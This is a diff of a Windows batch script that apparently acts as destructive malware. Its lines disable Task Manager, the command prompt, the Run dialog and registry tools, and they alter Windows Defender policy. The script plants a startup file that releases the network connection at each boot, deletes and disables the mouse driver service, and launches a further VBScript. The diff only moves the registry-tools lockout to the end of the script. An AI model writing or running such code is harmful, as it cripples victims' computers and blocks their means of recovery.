@@ -151,7 +151,6 @@ powershell.exe -command "REG ADD “hklm\software\policies\microsoft\windows def
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
 start https://www.youtube.com/watch?v=AK8uJcCsRDM
 cd "C:\Users\volde\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 echo ipconfig /release > startup.bat
@@ -178,4 +177,5 @@ set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
 reg delete %key%
 reg add %key% /v Start /t REG_DWORD /d 4
 rem ---------------------------------
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
 start sc.vbs
